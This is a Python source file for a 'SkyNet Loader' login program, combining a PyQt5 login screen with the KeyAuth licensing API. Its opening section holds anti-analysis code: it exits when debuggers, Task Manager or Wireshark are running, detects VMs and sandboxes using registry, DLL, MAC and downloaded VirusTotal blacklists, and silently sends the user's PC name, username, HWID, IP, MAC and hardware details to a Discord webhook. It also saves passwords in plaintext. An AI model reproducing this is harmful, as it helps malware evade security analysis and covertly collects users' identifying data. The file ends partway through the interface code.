# -*- coding: utf-8 -*-

# Form implementation generated from reading ui file 'Login.ui'
#
# Created by: Marci and PyQt5 UI code generator 5.14.2
#
# WARNING! All changes made in this file will be lost!


###############################################MODULES###############################################
import json as jsond  # json
import time  # sleep before exit
import binascii  # hex encoding
import requests  # https requests
from uuid import uuid4  # gen random guid
import win32gui, win32con
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from Crypto.Util.Padding import pad, unpad
# aes + padding, sha256
import platform
import subprocess
import datetime
from datetime import datetime
import sys
import os
import os.path
from requests_toolbelt.adapters.fingerprint import FingerprintAdapter
import colorama
from colorama import Fore
from colorama import Style
import Files.files_rc_rc
import sys, os, re, ctypes, subprocess, requests
import uuid
import platform, wmi, psutil
from datetime import datetime
from urllib.request import Request, urlopen
import dhooks
from dhooks import Webhook
import time
import asyncio
import threading
###############################################MODULES###############################################

os.system("cls")

###############################################SETTINGS###############################################
vmcheck_switch = True
vtdetect_switch = True
listcheck_switch = True
anti_debug_switch = True
#If everything is on the program will be fully protected!
###############################################SETTINGS###############################################

def block_debugger():
    while True:
        time.sleep(0.7)
        #print("Checking for debuggers...")
        for proc in psutil.process_iter():
            try:
                processName = proc.name()
                if processName == "HTTPDebuggerUI.exe":
                    print("Blacklisted program found! HTTPDebuggerUI.exe")
                    time.sleep(0)
                    os._exit(1) 
                if processName == "HTTPDebuggerSvc.exe":
                    print("Blacklisted program found! HTTPDebuggerSvc.exe")
                    time.sleep(0)
                    os._exit(1)
                if processName == "Taskmgr.exe":
                    print("Blacklisted program found! Task Manager")
                    time.sleep(0)
                    os._exit(1)
                if processName == "ProcessHacker.exe":
                    print("Blacklisted program found! ProcessHacker")
                    time.sleep(0)
                    os._exit(1)
                if processName == "Wireshark.exe":
                    print("Blacklisted program found! Wireshark")
                    time.sleep(0)
                    os._exit(1)
                if processName == "OLLYDBG.EXE":
                    print("Blacklisted program found! OLLYDBG")
                    time.sleep(0)
                    os._exit(1)
                if processName == "x64dbg.exe":
                    print("Blacklisted program found! x64dbg")
                    time.sleep(0)
                    os._exit(1)   
                if processName == "x32dbg.exe":
                    print("Blacklisted program found! x32dbg")
                    time.sleep(0)
                    os._exit(1)     
                if processName == "x96dbg.exe":
                    print("Blacklisted program found! x96dbg")
                    time.sleep(0)
                    os._exit(1)
                if processName == "ida64.exe":
                    print("Blacklisted program found! ida64")
                    time.sleep(0)
                    os._exit(1)   
                if processName == "KsDumperClient.exe":
                    print("Blacklisted program found! KsDumperClient")
                    time.sleep(0)
                    os._exit(1) 
                if processName == "KsDumper.exe":
                    print("Blacklisted program found! KsDumper")
                    time.sleep(0)
                    os._exit(1) 
                if processName == "pestudio.exe ":
                    print("Blacklisted program found! pestudio")
                    time.sleep(0)
                    os._exit(1)                                                   
            except:
                pass

def block_dlls():
    while True:
        time.sleep(0.7)
        #print("Checking for Sbie DLL Injection...")
        try:
            sandboxie = ctypes.cdll.LoadLibrary("SbieDll.dll")
            print("Sandboxie DLL Detected")
            requests.post(f'{api}',json={'content': f"**Sandboxie DLL Detected**"})
            os._exit(1)
        except:
            pass  

def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return ip

ip = getip()

serveruser = os.getenv("UserName")
pc_name = os.getenv("COMPUTERNAME")
mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
computer = wmi.WMI()
os_info = computer.Win32_OperatingSystem()[0]
os_name = os_info.Name.encode('utf-8').split(b'|')[0]
currentplat = os_name
hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
hwidlist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/hwid_list.txt')
pcnamelist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_name_list.txt')
pcusernamelist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_username_list.txt')
iplist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/ip_list.txt')
maclist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/mac_list.txt')
gpulist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/gpu_list.txt')
platformlist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_platforms.txt')
api = "webhook here"

def vtdetect():
    webhooksend = Webhook(api)
    webhooksend.send(f"""```yaml
![PC DETECTED]!  
PC Name: {pc_name}
PC Username: {serveruser}
HWID: {hwid}
IP: {ip}
MAC: {mac}
PLATFORM: {os_name}
CPU: {computer.Win32_Processor()[0].Name}
RAM: {str(round(psutil.virtual_memory().total / (1024.0 **3)))} GB
GPU: {computer.Win32_VideoController()[0].Name}
TIME: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}```""")


def vmcheck():
    def get_base_prefix_compat(): # define all of the checks
        return getattr(sys, "base_prefix", None) or getattr(sys, "real_prefix", None) or sys.prefix

    def in_virtualenv(): 
        return get_base_prefix_compat() != sys.prefix

    if in_virtualenv() == True: # if we are in a vm
        requests.post(f'{api}',json={'content': f"**VM DETECTED EXITING PROGRAM...**"})
        os._exit(1) # exit
    
    else:
        pass

    def registry_check():  #VM REGISTRY CHECK SYSTEM [BETA]
        reg1 = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul")
        reg2 = os.system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul")       
        
        if reg1 != 1 and reg2 != 1:    
            print("VMware Registry Detected")
            requests.post(f'{api}',json={'content': f"**VMware Registry Detected**"})
            os._exit(1)

    def processes_and_files_check():
        vmware_dll = os.path.join(os.environ["SystemRoot"], "System32\\vmGuestLib.dll")
        virtualbox_dll = os.path.join(os.environ["SystemRoot"], "vboxmrxnp.dll")    

        process = os.popen('TASKLIST /FI "STATUS eq RUNNING" | find /V "Image Name" | find /V "="').read()
        processList = []
        for processNames in process.split(" "):
            if ".exe" in processNames:
                processList.append(processNames.replace("K\n", "").replace("\n", ""))

        if "VMwareService.exe" in processList or "VMwareTray.exe" in processList:
            print("VMwareService.exe & VMwareTray.exe process are running")
            requests.post(f'{api}',json={'content': f"**VMwareService.exe & VMwareTray.exe process are running**"})
            os._exit(1)
                        
        if os.path.exists(vmware_dll): 
            print("Vmware DLL Detected")
            requests.post(f'{api}',json={'content': f"**Vmware DLL Detected**"})
            os._exit(1)
            
        if os.path.exists(virtualbox_dll):
            print("VirtualBox DLL Detected")
            requests.post(f'{api}',json={'content': f"**VirtualBox DLL Detected**"})
            os._exit(1)
        
        try:
            sandboxie = ctypes.cdll.LoadLibrary("SbieDll.dll")
            print("Sandboxie DLL Detected")
            requests.post(f'{api}',json={'content': f"**Sandboxie DLL Detected**"})
            os._exit(1)
        except:
            pass        

    def mac_check():
        mac_address = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        vmware_mac_list = ["00:05:69", "00:0c:29", "00:1c:14", "00:50:56"]
        if mac_address[:8] in vmware_mac_list:
            print("VMware MAC Address Detected")
            requests.post(f'{api}',json={'content': f"**VMware MAC Address Detected**"})
            os._exit(1)
    print("[*] Checking VM")
    registry_check()
    processes_and_files_check()
    mac_check()
    print("[+] VM Not Detected : )")   
    webhooksend = Webhook(api)
    webhooksend.send("[+] VM Not Detected : )") 


def listcheck():
    try:
        if hwid in hwidlist.text:
            print('BLACKLISTED HWID DETECTED')
            print(f'HWID: {hwid}') 
            requests.post(f'{api}',json={'content': f"**Blacklisted HWID Detected. HWID:** `{hwid}`"})
            time.sleep(2)
            os._exit(1)
        else:
            pass
    except:
        print('[ERROR]: Failed to connect to database.')
        time.sleep(2) 
        os._exit(1)

    try:
        if serveruser in pcusernamelist.text:
            print('BLACKLISTED PC USER DETECTED!')
            print(f'PC USER: {serveruser}') 
            requests.post(f'{api}',json={'content': f"**Blacklisted PC User:** `{serveruser}`"})
            time.sleep(2)
            os._exit(1)
        else:
            pass
    except:
        print('[ERROR]: Failed to connect to database.')
        time.sleep(2) 
        os._exit(1)

    try:
        if pc_name in pcnamelist.text:
            print('BLACKLISTED PC NAME DETECTED!')
            print(f'PC NAME: {pc_name}') 
            requests.post(f'{api}',json={'content': f"**Blacklisted PC Name:** `{pc_name}`"})
            time.sleep(2)
            os._exit(1)
        else:
            pass
    except:
        print('[ERROR]: Failed to connect to database.')
        time.sleep(2) 
        os._exit(1)

    try:
        if ip in iplist.text:
            print('BLACKLISTED IP DETECTED!')
            print(f'IP: {ip}') 
            requests.post(f'{api}',json={'content': f"**Blacklisted IP:** `{ip}`"})
            time.sleep(2)
            os._exit(1)
        else:
            pass
    except:
        print('[ERROR]: Failed to connect to database.')
        time.sleep(2) 
        os._exit(1)

    try:
        if mac in maclist.text:
            print('BLACKLISTED MAC DETECTED!')
            print(f'MAC: {mac}') 
            requests.post(f'{api}',json={'content': f"**Blacklisted MAC:** `{mac}`"})
            time.sleep(2)
            os._exit(1)
        else:
            pass
    except:
        print('[ERROR]: Failed to connect to database.')
        time.sleep(2) 
        os._exit(1)

    gpu = computer.Win32_VideoController()[0].Name

    try:
        if gpu in gpulist.text:        
            print('BLACKLISTED GPU DETECTED!')
            print(f'GPU: {gpu}') 
            requests.post(f'{api}',json={'content': f"**Blacklisted GPU:** `{gpu}`"})
            time.sleep(2)
            os._exit(1)
        else:
            pass
    except:
        print('[ERROR]: Failed to connect to database.')
        time.sleep(2) 
        os._exit(1)


if anti_debug_switch == True:
    try:
        b = threading.Thread(name='Anti-Debug', target=block_debugger)
        b.start()
        b2 = threading.Thread(name='Anti-DLL', target=block_dlls)
        b2.start()
    except:
        pass
else:
    pass

if vtdetect_switch == True:
    vtdetect()
else:
    pass
if vmcheck_switch == True:
    vmcheck()
else:
    pass
if listcheck_switch == True:
    listcheck()
else:
    pass


def slow_type(text, speed, newLine = True):
    for i in text:
        print(i, end = "", flush = True)
        time.sleep(speed)
    if newLine: 
        print() 

def all():
    print("Hello, this is my test program!")
    time.sleep(3)
    os._exit(1)

class api:
    name = ownerid = secret = version = ""

    def __init__(self, name, ownerid, secret, version):
        self.name = name

        self.ownerid = ownerid

        self.secret = secret

        self.version = version

    sessionid = enckey = ""

    def init(self):

        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        self.enckey = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify(("init").encode()),
            "ver": encryption.encrypt(self.version, self.secret, init_iv),
            "enckey": encryption.encrypt(self.enckey, self.secret, init_iv),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        response = self.__do_request(post_data)

        if response == "KeyAuth_Invalid":
            print("The application doesn't exist")
            sys.exit()

        response = encryption.decrypt(response, self.secret, init_iv)
        json = jsond.loads(response)

        if not json["success"]:
            print(json["message"])
            sys.exit()

        self.sessionid = json["sessionid"]

    def register(self, user, password, license, hwid=None):
        if hwid is None:
            hwid = others.get_hwid()

        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify(("register").encode()),
            "username": encryption.encrypt(user, self.enckey, init_iv),
            "pass": encryption.encrypt(password, self.enckey, init_iv),
            "key": encryption.encrypt(license, self.enckey, init_iv),
            "hwid": encryption.encrypt(hwid, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        response = self.__do_request(post_data)

        response = encryption.decrypt(response, self.enckey, init_iv)

        json = jsond.loads(response)

        if json["success"]:
            time.sleep(1)
            print("Successfully registered! Restarting program...")
            time.sleep(1)
            python = sys.executable
            os.execl(python, python, *sys.argv)
        else:
            print(json["message"])
            sys.exit()

    def upgrade(self, user, license):

        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify(("upgrade").encode()),
            "username": encryption.encrypt(user, self.enckey, init_iv),
            "key": encryption.encrypt(license, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        response = self.__do_request(post_data)

        response = encryption.decrypt(response, self.enckey, init_iv)

        json = jsond.loads(response)

        if json["success"]:
            print("Successfully upgraded user!")
        else:
            print(json["message"])
            sys.exit()

    def login(self, user, password, hwid=None):
        if hwid is None:
            hwid = others.get_hwid()

        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify(("login").encode()),
            "username": encryption.encrypt(user, self.enckey, init_iv),
            "pass": encryption.encrypt(password, self.enckey, init_iv),
            "hwid": encryption.encrypt(hwid, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        response = self.__do_request(post_data)

        response = encryption.decrypt(response, self.enckey, init_iv)

        json = jsond.loads(response)

        if json["success"]:
            self.__load_user_data(json["info"])
            time.sleep(1)
            os.system("cls")
            slow_type(f"{Fore.RED}Successfully logged in! Starting program...{Fore.RESET}", 0.03)
            time.sleep(1)
            os.system("cls")
            n = int(self.user_data.expires)
            n2 = int(self.user_data.createdate)
            n3 = int(self.user_data.lastlogin)
            slow_type(f"{Fore.RED}Welcome back {Fore.GREEN}{keyauthapp.user_data.username}!", 0.02)
            slow_type(f"\n{Fore.RED}IP address: {Fore.GREEN}{keyauthapp.user_data.ip}", 0.02)
            slow_type(f"{Fore.RED}Hardware-Id: {Fore.GREEN}{keyauthapp.user_data.hwid}", 0.02)
            slow_type(f"{Fore.RED}Created at: {Fore.GREEN}{datetime.utcfromtimestamp(n2).strftime('%Y-%m-%d %H:%M:%S')}", 0.02)
            slow_type(f"{Fore.RED}Expires at: {Fore.GREEN}{datetime.utcfromtimestamp(n).strftime('%Y-%m-%d %H:%M:%S')}", 0.02)
            slow_type(f"{Fore.RED}Last login at: {Fore.GREEN}{datetime.utcfromtimestamp(n3).strftime('%Y-%m-%d %H:%M:%S')}{Fore.RESET}", 0.02)
            time.sleep(2)
            hider = win32gui.FindWindowEx(None, None, None, "SkyNet Loader - Login")
            win32gui.ShowWindow(hider, win32con.SW_HIDE)
            os.system('cls')
            all()
        else:
            print(json["message"])
            time.sleep(2)
            sys.exit()

    def license(self, key, hwid=None):
        if hwid is None:
            hwid = others.get_hwid()

        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify(("license").encode()),
            "key": encryption.encrypt(key, self.enckey, init_iv),
            "hwid": encryption.encrypt(hwid, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        response = self.__do_request(post_data)
        response = encryption.decrypt(response, self.enckey, init_iv)

        json = jsond.loads(response)

        if json["success"]:
            self.__load_user_data(json["info"])
            time.sleep(1)
            print("Successfully logged into license! Starting program...")
            time.sleep(1)
            all()
        else:
            print(json["message"])
            sys.exit()

    def var(self, name):

        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify(("var").encode()),
            "varid": encryption.encrypt(name, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        response = self.__do_request(post_data)

        response = encryption.decrypt(response, self.enckey, init_iv)

        json = jsond.loads(response)

        if json["success"]:
            return json["message"]
        else:
            print(json["message"])
            time.sleep(5)
            sys.exit()

    def file(self, fileid):

        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify(("file").encode()),
            "fileid": encryption.encrypt(fileid, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        response = self.__do_request(post_data)

        response = encryption.decrypt(response, self.enckey, init_iv)

        json = jsond.loads(response)

        if not json["success"]:
            print(json["message"])
            time.sleep(5)
            sys.exit()
        return binascii.unhexlify(json["contents"])

    def webhook(self, webid, param):

        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify(("webhook").encode()),
            "webid": encryption.encrypt(webid, self.enckey, init_iv),
            "params": encryption.encrypt(param, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        response = self.__do_request(post_data)

        response = encryption.decrypt(response, self.enckey, init_iv)
        json = jsond.loads(response)

        if json["success"]:
            return json["message"]
        else:
            print(json["message"])
            time.sleep(5)
            sys.exit()

    def log(self, message):

        init_iv = SHA256.new(str(uuid4())[:8].encode()).hexdigest()

        post_data = {
            "type": binascii.hexlify(("log").encode()),
            "pcuser": encryption.encrypt(os.getenv('username'), self.enckey, init_iv),
            "message": encryption.encrypt(message, self.enckey, init_iv),
            "sessionid": binascii.hexlify(self.sessionid.encode()),
            "name": binascii.hexlify(self.name.encode()),
            "ownerid": binascii.hexlify(self.ownerid.encode()),
            "init_iv": init_iv
        }

        self.__do_request(post_data)

    def __do_request(self, post_data):

        rq_out = requests.post(
            "https://keyauth.win/api/1.0/", data=post_data
        )

        return rq_out.text

    # region user_data
    class user_data_class:
        username = ip = hwid = expires = createdate = lastlogin = ""

    user_data = user_data_class()

    def __load_user_data(self, data):
        self.user_data.username = data["username"]
        self.user_data.ip = data["ip"]
        self.user_data.hwid = data["hwid"]
        self.user_data.expires = data["subscriptions"][0]["expiry"]
        self.user_data.createdate = data["createdate"]
        self.user_data.lastlogin = data["lastlogin"]


class others:
    @staticmethod
    def get_hwid():
        if platform.system() != "Windows":
            return "None"

        cmd = subprocess.Popen(
            "wmic useraccount where name='%username%' get sid", stdout=subprocess.PIPE, shell=True)

        (suppost_sid, error) = cmd.communicate()

        suppost_sid = suppost_sid.split(b'\n')[1].strip()

        return suppost_sid.decode()


class encryption:
    @staticmethod
    def encrypt_string(plain_text, key, iv):
        plain_text = pad(plain_text, 16)

        aes_instance = AES.new(key, AES.MODE_CBC, iv)

        raw_out = aes_instance.encrypt(plain_text)

        return binascii.hexlify(raw_out)

    @staticmethod
    def decrypt_string(cipher_text, key, iv):
        cipher_text = binascii.unhexlify(cipher_text)

        aes_instance = AES.new(key, AES.MODE_CBC, iv)

        cipher_text = aes_instance.decrypt(cipher_text)

        return unpad(cipher_text, 16)

    @staticmethod
    def encrypt(message, enc_key, iv):
        try:
            _key = SHA256.new(enc_key.encode()).hexdigest()[:32]

            _iv = SHA256.new(iv.encode()).hexdigest()[:16]

            return encryption.encrypt_string(message.encode(), _key.encode(), _iv.encode()).decode()
        except:
            print("Invalid Application Information. Long text is secret short text is ownerid. Name is supposed to be app name not username")
            sys.exit()

    @staticmethod
    def decrypt(message, enc_key, iv):
        try:
            _key = SHA256.new(enc_key.encode()).hexdigest()[:32]

            _iv = SHA256.new(iv.encode()).hexdigest()[:16]

            return encryption.decrypt_string(message.encode(), _key.encode(), _iv.encode()).decode()
        except:
            print("Invalid Application Information. Long text is secret short text is ownerid. Name is supposed to be app name not username")
            sys.exit()

os.system("cls")

keyauthapp = api("appname", "ownerid", "secret","1.0")

keyauthapp.init()

colorama.init()

time.sleep(1)
try:
    if os.path.isfile('Files/auth.json'):
        with open('Files/auth.json', 'r') as f:
            authfile = jsond.load(f)
            authuser = authfile.get('authusername')
            authpass = authfile.get('authpassword')
            keyauthapp.login(authuser,authpass)
    else:
        pass
except:
    print("Error while loading auth file... check if the auth file is missing or not")
    time.sleep(3)
    os._exit(1)


from PyQt5 import QtCore, QtGui, QtWidgets


class Ui_MainWindow(object):
    #
    # STYLES
    #
    styleLineEditOk = ("QLineEdit {\n"
"    border: 2px solid rgb(45, 45, 45);\n"
"    border-radius: 5px;\n"
"    padding: 15px;\n"
"    background-color: rgb(30, 30, 30);    \n"
"    color: rgb(100, 100, 100);\n"
"}\n"
"QLineEdit:hover {\n"
"    border: 2px solid rgb(55, 55, 55);\n"
"}\n"
"QLineEdit:focus {\n"
"    border: 2px solid rgb(255, 207, 0);    \n"
"    color: rgb(200, 200, 200);\n"
"}")

    styleLineEditError = ("QLineEdit {\n"
"    border: 2px solid rgb(255, 85, 127);\n"
"    border-radius: 5px;\n"
"    padding: 15px;\n"
"    background-color: rgb(30, 30, 30);    \n"
"    color: rgb(100, 100, 100);\n"
"}\n"
"QLineEdit:hover {\n"
"    border: 2px solid rgb(55, 55, 55);\n"
"}\n"
"QLineEdit:focus {\n"
"    border: 2px solid rgb(255, 207, 0);    \n"
"    color: rgb(200, 200, 200);\n"
"}")

    stylePopupError = ("background-color: rgb(255, 85, 127); border-radius: 5px;")
    stylePopupOk = ("background-color: rgb(0, 255, 123); border-radius: 5px;")

    #
    # FUNCTIONS
    #
    def checkFields(self):
        textUser = ""
        textPassword = ""

        def showMessage(message):
            self.frame_error.show()
            self.label_error.setText(message)

        # CHECK USER
        if not self.lineEdit_user.text():
            textUser = " User Empyt. "
            self.lineEdit_user.setStyleSheet(self.styleLineEditError)
        else:
            textUser = ""
            self.lineEdit_user.setStyleSheet(self.styleLineEditOk)

        # CHECK PASSWORD
        if not self.lineEdit_password.text():
            textPassword = " Password Empyt. "
            self.lineEdit_password.setStyleSheet(self.styleLineEditError)
        else:
            textPassword = ""
            self.lineEdit_password.setStyleSheet(self.styleLineEditOk)


        # CHECK FIELDS
        if textUser + textPassword != '':
            text = textUser + textPassword
            showMessage(text)
            self.frame_error.setStyleSheet(self.stylePopupError)
        else:
            user = self.lineEdit_user.text()
            password = self.lineEdit_password.text()
            text = " Login Successful. "
            #print(f"Login {self.lineEdit_user.text()} {self.lineEdit_password.text()}")
            if self.checkBox_save_user.isChecked():
                import json as jason
                config = jason.load(open("Files/auth.json"))
                config["authusername"] = (self.lineEdit_user.text())
                jason.dump(config, open('Files/auth.json', 'w'), sort_keys=False, indent=4)
                config["authpassword"] = (self.lineEdit_password.text())
                jason.dump(config, open('Files/auth.json', 'w'), sort_keys=False, indent=4)
                text = text + " | Save user: Yes "
            showMessage(text)
            self.frame_error.setStyleSheet(self.stylePopupOk)
            keyauthapp.login(user,password)

    def setupUi(self, MainWindow):
        MainWindow.setObjectName("MainWindow")
        MainWindow.resize(500, 700)
        MainWindow.setMinimumSize(QtCore.QSize(500, 700))
        font = QtGui.QFont()
        font.setFamily("Segoe UI")
        font.setPointSize(10)
        MainWindow.setFont(font)
        icon = QtGui.QIcon()
        icon.addPixmap(QtGui.QPixmap(":/Icon/Images/Icon.ico"), QtGui.QIcon.Normal, QtGui.QIcon.Off)
        MainWindow.setWindowIcon(icon)
        MainWindow.setStyleSheet("color: rgb(200, 200, 200);\n"
"background-color: rgb(10, 10, 10);")
        self.centralwidget = QtWidgets.QWidget(MainWindow)
        self.centralwidget.setObjectName("centralwidget")
        self.verticalLayout = QtWidgets.QVBoxLayout(self.centralwidget)
        self.verticalLayout.setContentsMargins(0, 0, 0, 0)
        self.verticalLayout.setSpacing(0)
        self.verticalLayout.setObjectName("verticalLayout")
        self.top_bar = QtWidgets.QFrame(self.centralwidget)
        self.top_bar.setMaximumSize(QtCore.QSize(16777215, 35))
        self.top_bar.setStyleSheet("")
        self.top_bar.setFrameShape(QtWidgets.QFrame.NoFrame)
        self.top_bar.setFrameShadow(QtWidgets.QFrame.Raised)
        self.top_bar.setObjectName("top_bar")
        self.horizontalLayout_2 = QtWidgets.QHBoxLayout(self.top_bar)
        self.horizontalLayout_2.setContentsMargins(0, 5, 0, 0)
        self.horizontalLayout_2.setSpacing(0)
        self.horizontalLayout_2.setObjectName("horizontalLayout_2")
        self.frame_error = QtWidgets.QFrame(self.top_bar)
        self.frame_error.setMaximumSize(QtCore.QSize(450, 16777215))
        self.frame_error.setStyleSheet(self.stylePopupError)
        self.frame_error.setFrameShape(QtWidgets.QFrame.StyledPanel)
        self.frame_error.setFrameShadow(QtWidgets.QFrame.Raised)
        self.frame_error.setObjectName("frame_error")
        self.horizontalLayout_3 = QtWidgets.QHBoxLayout(self.frame_error)
        self.horizontalLayout_3.setContentsMargins(10, 3, 10, 3)
        self.horizontalLayout_3.setObjectName("horizontalLayout_3")
        self.label_error = QtWidgets.QLabel(self.frame_error)
        self.label_error.setStyleSheet("color: rgb(35, 35, 35);")
        self.label_error.setAlignment(QtCore.Qt.AlignCenter)
        self.label_error.setObjectName("label_error")
        self.horizontalLayout_3.addWidget(self.label_error)
        self.pushButton_close_popup = QtWidgets.QPushButton(self.frame_error)
        self.pushButton_close_popup.setMaximumSize(QtCore.QSize(20, 20))
        self.pushButton_close_popup.setStyleSheet("QPushButton {\n"
"    border-radius: 5px;    \n"
"    background-image: url(:/Close_Image/Images/cil-x.png);\n"
"    background-position: center;    \n"
"    background-color: rgb(60, 60, 60);\n"
"}\n"
"QPushButton:hover {\n"
"    background-color: rgb(50, 50, 50);    \n"
"    color: rgb(200, 200, 200);\n"
"}\n"
"QPushButton:pressed {\n"
"    background-color: rgb(35, 35, 35);    \n"
"    color: rgb(200, 200, 200);\n"
"}")
        self.pushButton_close_popup.setText("")
        self.pushButton_close_popup.setObjectName("pushButton_close_popup")
        self.horizontalLayout_3.addWidget(self.pushButton_close_popup)
        self.horizontalLayout_2.addWidget(self.frame_error)
        self.verticalLayout.addWidget(self.top_bar)
        self.content = QtWidgets.QFrame(self.centralwidget)
        self.content.setStyleSheet("")
        self.content.setFrameShape(QtWidgets.QFrame.NoFrame)
        self.content.setFrameShadow(QtWidgets.QFrame.Raised)
        self.content.setObjectName("content")
        self.horizontalLayout = QtWidgets.QHBoxLayout(self.content)
        self.horizontalLayout.setObjectName("horizontalLayout")
        self.login_area = QtWidgets.QFrame(self.content)
        self.login_area.setMaximumSize(QtCore.QSize(450, 550))
        self.login_area.setStyleSheet("border-radius: 10px;")
        self.login_area.setFrameShape(QtWidgets.QFrame.NoFrame)
        self.login_area.setFrameShadow(QtWidgets.QFrame.Raised)
        self.login_area.setObjectName("login_area")
        self.logo = QtWidgets.QFrame(self.login_area)
        self.logo.setGeometry(QtCore.QRect(45, 0, 360, 360))
        self.logo.setStyleSheet("background-image: url(:/Logo/Images/logo_360x90.png);\n"
"background-repeat: no-repeat;\n"
"background-position: center;")
        self.logo.setFrameShape(QtWidgets.QFrame.StyledPanel)
        self.logo.setFrameShadow(QtWidgets.QFrame.Raised)
        self.logo.setObjectName("logo")
        self.lineEdit_user = QtWidgets.QLineEdit(self.login_area)
        self.lineEdit_user.setGeometry(QtCore.QRect(85, 288, 280, 50))
        font = QtGui.QFont()
        font.setFamily("Segoe UI")
        font.setPointSize(10)
        self.lineEdit_user.setFont(font)

        self.lineEdit_user.setStyleSheet(self.styleLineEditOk)

        self.lineEdit_user.setMaxLength(32)
        self.lineEdit_user.setObjectName("lineEdit_user")
        self.lineEdit_password = QtWidgets.QLineEdit(self.login_area)
        self.lineEdit_password.setGeometry(QtCore.QRect(85, 340, 280, 50))
        font = QtGui.QFont()
        font.setFamily("Segoe UI")
        font.setPointSize(10)
        self.lineEdit_password.setFont(font)

        self.lineEdit_password.setStyleSheet(self.styleLineEditOk)

        self.lineEdit_password.setMaxLength(16)
        self.lineEdit_password.setEchoMode(QtWidgets.QLineEdit.Password)
        self.lineEdit_password.setObjectName("lineEdit_password")
        self.checkBox_save_user = QtWidgets.QCheckBox(self.login_area)
        self.checkBox_save_user.setGeometry(QtCore.QRect(85, 395, 281, 22))
        font = QtGui.QFont()
        font.setFamily("Segoe UI")
        font.setPointSize(10)
        self.checkBox_save_user.setFont(font)
        self.checkBox_save_user.setStyleSheet("QCheckBox::indicator {\n"
"    border: 3px solid rgb(100, 100, 100);\n"
"    width: 15px;\n"
"    height: 15px;\n"
"    border-radius: 10px;    \n"
"    background-color: rgb(135, 135, 135);\n"
"}\n"
"QCheckBox::indicator:checked {\n"
"    border: 3px solid rgb(255, 205, 0);\n"
"    background-color: rgb(255, 255, 0);\n"
"}")
        self.checkBox_save_user.setObjectName("checkBox_save_user")
        self.pushButton_login = QtWidgets.QPushButton(self.login_area)
        self.pushButton_login.setGeometry(QtCore.QRect(85, 425, 280, 50))
        self.pushButton_login.setStyleSheet("QPushButton {    \n"
"    background-color: rgb(50, 50, 50);\n"
"    border: 2px solid rgb(60, 60, 60);\n"
"    border-radius: 5px;\n"
"}\n"
"QPushButton:hover {    \n"
"    background-color: rgb(60, 60, 60);\n"
"    border: 2px solid rgb(70, 70, 70);\n"
"}\n"
"QPushButton:pressed {    \n"
"    background-color: rgb(250, 230, 0);\n"
"    border: 2px solid rgb(255, 165, 24);    \n"
"    color: rgb(35, 35, 35);\n"
"}")
        self.pushButton_login.setObjectName("pushButton_login")
        self.horizontalLayout.addWidget(self.login_area)
        self.verticalLayout.addWidget(self.content)
        self.bottom = QtWidgets.QFrame(self.centralwidget)
        self.bottom.setMaximumSize(QtCore.QSize(16777215, 35))
        self.bottom.setStyleSheet("background-color: rgb(15, 15, 15)")
        self.bottom.setFrameShape(QtWidgets.QFrame.NoFrame)
